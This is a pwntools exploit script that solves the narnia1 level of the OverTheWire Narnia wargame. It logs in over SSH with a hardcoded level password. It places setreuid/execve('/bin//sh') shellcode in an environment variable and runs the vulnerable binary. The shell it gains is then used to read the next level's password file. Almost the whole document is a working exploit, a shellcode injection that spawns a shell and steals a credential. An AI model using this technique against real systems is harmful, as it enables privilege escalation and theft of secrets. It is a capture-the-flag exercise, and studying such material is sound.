from pwn import *
context(arch='i386', os='linux')
s = ssh(user='narnia1', host='narnia.labs.overthewire.org', password='efeidiedae', port=2226)
sh = s.run('export EGG=$(python -c \'print \"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80\"\'); /narnia/narnia1')
sh.sendline('cat /etc/narnia_pass/narnia2')
ans=sh.recvline()
ans+=sh.recvline()
log.info('Flag: '+ans[-11:])
s.close()